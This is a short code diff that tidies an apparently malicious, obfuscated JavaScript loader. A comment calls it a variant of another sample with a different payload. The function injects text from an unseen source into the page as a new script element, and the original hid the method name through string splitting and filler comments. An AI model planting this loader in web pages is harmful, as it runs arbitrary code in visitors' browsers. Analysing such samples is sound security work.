@@ -1,6 +1,14 @@
+/* Equivalent to java2.js except for having a different payload */
+
+
 function fvbnvbn()/*s6992d8248hfj52576fs*/ {
-    var a = l(), fds = "re", c = document, b = c["createElement"]("script");/*s63594dfg92014hfhgj74056fs*/
-    b["type"] = "text/javascript", b["text"] = a, a = c["getElementsByTagName"]("script")[0], a.parentNode["inse" + "rtBefo" + fds](b, a)
+    var a = l();
+    c = document;
+    b = c["createElement"]("script");/*s63594dfg92014hfhgj74056fs*/
+    b["type"] = "text/javascript";
+    b["text"] = a;
+    a = c["getElementsByTagName"]("script")[0];
+    a.parentNode["insertBefore"](b, a);
 }
 
 try {
